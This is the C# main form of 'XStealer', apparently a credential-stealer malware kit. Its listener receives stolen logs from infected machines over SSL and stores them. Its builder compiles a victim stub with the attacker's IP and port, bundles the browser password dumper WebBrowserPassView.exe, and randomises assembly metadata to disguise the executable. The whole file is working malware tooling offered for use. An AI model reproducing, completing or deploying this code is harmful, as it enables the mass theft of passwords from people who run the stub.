using System;
using System.IO;
using System.Drawing;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading.Tasks;

namespace XStealer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        // Server port
        public static string Ip;

        // Server port
        public static int Port;

        // Store path to logs
        public static string LogPath = Directory.GetCurrentDirectory() + @"\Logs";

        private void Form1_Load(object sender, EventArgs e)
        {
            // Check if dll exists
            if (!File.Exists("BouncyCastle.Crypto.dll"))
            {
                // Show messagebox
                MessageBox.Show("Error: Missing DLL(BouncyCastle.Crypto.dll). Make sure its in the same directory as this program", "XStealer", MessageBoxButtons.OK, MessageBoxIcon.Error);

                // Exit
                Environment.Exit(0);
            }

            // Create and run task
            Task.Factory.StartNew(() =>
            {
                // Check if directory exists
                if (!Directory.Exists(LogPath))
                {
                    // Create directory
                    Directory.CreateDirectory(LogPath);
                }

                // Update log count
                UpdateLogCount();

                // Load settings
                textBox1.Text = Properties.Settings.Default.ListenerTbox1;
                textBox2.Text = Properties.Settings.Default.ListenerTbox2;
                checkBox3.Checked = Properties.Settings.Default.LogNotification;

                // Get file info from log directory
                FileInfo[] Files = new DirectoryInfo(LogPath).GetFiles("*.txt");

                // Check if Files length isnt 0
                if (Files.Length != 0)
                {
                    // Loop through file names and add them to listview
                    for(int i = 0; i < Files.Length; i++)
                    {
                        // Invoke method
                        listView1.Invoke((MethodInvoker)delegate
                        {
                            // Add items to listview + remove .txt extention
                            listView1.Items.Add(Files[i].ToString().Substring(0, Files[i].ToString().Length - 4));
                        });                       
                    }
                }
            });
        }

        private void button1_Click(object sender, EventArgs e)
        {
            // Check if ip is valid
            if (General.ValidateIPv4(textBox1.Text) == true)
            {
                // Check if port is valid
                if (textBox2.TextLength != 0)
                {
                    // Set textbox's to read only
                    textBox1.ReadOnly = true;
                    textBox2.ReadOnly = true;

                    // Disable button
                    button1.Enabled = false;

                    // Set lable color
                    label4.ForeColor = Color.DarkOrange;

                    // Change lable text
                    label4.Text = "Loading..";

                    // Create and run task
                    Task.Factory.StartNew(() =>
                    {
                        // Set ip/port
                        Ip = textBox1.Text;
                        Port = int.Parse(textBox2.Text);

                        // Check if cert exists
                        if (File.Exists("SSLCert.crt"))
                        {
                            // Delete cert
                            File.Delete("SSLCert.crt");
                        }

                        // Create cert
                        CertificateCreator.CreateCert("SSLCert");

                        // Wait for everything to finish
                        Thread.Sleep(1000);

                        // Declair listener thread
                        Thread listener = new Thread(Listener)
                        {
                            // Set thread to background so the program can exit propperly
                            IsBackground = true
                        };

                        // Start listener thread
                        listener.Start();

                        // Set lable color
                        label4.ForeColor = Color.Green;

                        // Invoke method
                        label4.Invoke((MethodInvoker)delegate
                        {
                            // Change lable text
                            label4.Text = "True";

                            // Chanage form text(title)
                            Text = Text + " - Listening";
                        });

                    });
                } else
                {
                    // Display messagebox
                    MessageBox.Show("Error: invalid port");
                }
            } else
            {
                // Display messagebox
                MessageBox.Show("Error: invalid ip");
            }
        }

        // Listener method
        public void Listener()
        {
            // Set info string array
            string[] Info;

            // Infinite loop
            while (true)
            {
                // Catch exeptions 
                try
                {
                    // Listen for client connections
                    SocketHandler.Listen();

                    // Connect
                    SocketHandler.Connect();

                    // Receive data, split and put into string array
                    Info = SocketHandler.Receive().Split('~');

                    // Disconnect
                    SocketHandler.Disconnect();

                    AddNewLog(Info);
                }
                catch //(Exception EX) // Debug purposes
                {
                    //MessageBox.Show(EX.ToString()); // Debug purposes

                    // Wait before retrying
                    Thread.Sleep(5000);
                }
            }
        }

        // AddNewLog method
        private void AddNewLog(string[] LogInfo)
        {
            // Check if spesific log exists
            if (!File.Exists(LogPath + @"\" + LogInfo[0] + ".txt"))
            {
                // Invoke method
                listView1.Invoke((MethodInvoker)delegate
                {
                    // Add to listview
                    listView1.Items.Add(LogInfo[0]);
                });
            }

            // Create log file
            File.WriteAllText(LogPath + @"\" + LogInfo[0] + ".txt", LogInfo[1]);

            // Update log count
            UpdateLogCount();

            // Check if user wants notifications
            if (checkBox3.Checked == true)
            {
                // Create balloon(system) notification
                notifyIcon1.ShowBalloonTip(3000, "XStealer", "New log (" + LogInfo[0] + ")", ToolTipIcon.Info);
            }
        }

        // UpdateLogCount megthod
        public void UpdateLogCount()
        {
            // Read log directory file info
            FileInfo[] Files = new DirectoryInfo(LogPath).GetFiles("*.txt");

            // Invoke method
            label6.Invoke((MethodInvoker)delegate
            {
                // Add to lable
                label6.Text = Files.Length.ToString();
            });
        }

        // AssemblyInfo string array
        public static string[] AssemblyInfo = new string[7];

        private void button4_Click(object sender, EventArgs e)
        {
            // Check if ip is valid
            if(General.ValidateIPv4(textBox4.Text) == true)
            {
                // Check if port is valid
                if (textBox3.TextLength != 0)
                {
                    // Set variables
                    string Code = General.ReadStubCode("Code.txt", "XStealer", "StubFiles");
                    string Ico = "";
                    string OutputPath;

                    // Set user settings
                    Code = Code.Replace("%IP%", textBox4.Text);
                    Code = Code.Replace("%PORT%", textBox3.Text);

                    // Check if icon is wanted
                    if (textBox12.Text.Length == 0)
                    {
                        Ico = null;
                    }
                    else
                    {
                        Ico = textBox12.Text;
                    }

                    // Set assembly
                    AssemblyInfo[0] = textBox6.Text;
                    AssemblyInfo[1] = textBox5.Text;
                    AssemblyInfo[2] = textBox8.Text;
                    AssemblyInfo[3] = textBox7.Text;
                    AssemblyInfo[4] = textBox10.Text;
                    AssemblyInfo[5] = textBox9.Text;
                    AssemblyInfo[6] = textBox11.Text;

                    // Set output path
                    OutputPath = FileDialog.Sfd("exe output|*.exe");

                    // Check if file exists
                    if (!File.Exists("WebBrowserPassView.exe"))
                    {
                        // Extract file from resources
                        General.Extract("XStealer", Directory.GetCurrentDirectory(), "StubFiles", "WebBrowserPassView.exe");
                    }

                    // Compile stub
                    CodeDom.CompileExecutable(new[] { Code }, OutputPath, Ico, AssemblyInfo, new[] { "WebBrowserPassView.exe" }, false, new[] { "system.dll" });

                    // Delete file
                    File.Delete("WebBrowserPassView.exe");
                } else
                {
                    // Display messagebox
                    MessageBox.Show("Error: invalid port");
                }
            } else
            {
                // Display messagebox
                MessageBox.Show("Error: invalid ip");
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            // Set random assembly
            textBox6.Text = General.CreateRandomString(12);
            textBox5.Text = General.CreateRandomString(12);
            textBox8.Text = General.CreateRandomString(12);
            textBox7.Text = General.CreateRandomString(12);
            textBox10.Text = General.CreateRandomString(12);
            textBox9.Text = General.CreateRandomString(12);

            // Clear textbox
            textBox11.Clear();

            // Loop 4 times
            for (int i = 0; i < 4; i++)
            {
                // Set textbox text
                textBox11.Text = textBox11.Text + General.Rand.Next(0, 9).ToString();

                // Check if i isnt equal to 3
                if (i != 3)
                {
                    // Set textbox text
                    textBox11.Text = textBox11.Text + ".";
                }
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            // show choose icon file fialog
            textBox12.Text = FileDialog.Ofd("Ico output|*.ico");
        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // Open log
            Process.Start(LogPath + @"\" + listView1.FocusedItem.Text + ".txt");
        }

        private void contextMenuStrip1_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            // Cancel opening of context menu if item isnt selected
            e.Cancel = listView1.SelectedItems.Count <= 0;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            // Set settings
            Properties.Settings.Default.ListenerTbox1 = textBox1.Text;
            Properties.Settings.Default.ListenerTbox2 = textBox2.Text;
            Properties.Settings.Default.LogNotification = checkBox3.Checked;

            // Save settings
            Properties.Settings.Default.Save();

            // Display messagebox
            MessageBox.Show("Settings saved");
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // Dubble check if user wants to delete log
            if (MessageBox.Show("Are you sure you want to delete this log?", "XStealer", MessageBoxButtons.YesNo) == DialogResult.Yes)
            {
                // Delete log
                File.Delete(LogPath + @"\" + listView1.FocusedItem.Text + ".txt");

                // Delete listview item
                listView1.FocusedItem.Remove();

                // Update log count
                UpdateLogCount();
            }
        }

        // Textbox filters
        #region Textbox filters
        private void textBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = General.ONAD(e);
        }

        private void textBox2_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = General.ON(e);
        }

        private void textBox3_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = General.ON(e);
        }

        private void textBox11_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = General.ONAD(e);
        }

        private void textBox4_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = General.ONAD(e);
        }
        #endregion

        //Empty form design methods
        #region Empty form design methods
        private void groupBox3_Enter(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void tabPage2_Click(object sender, EventArgs e)
        {

        }

        private void textBox12_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox6_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox5_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox8_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox7_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox10_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox9_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox11_TextChanged(object sender, EventArgs e)
        {

        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {

        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {

        }
        #endregion
    }
}
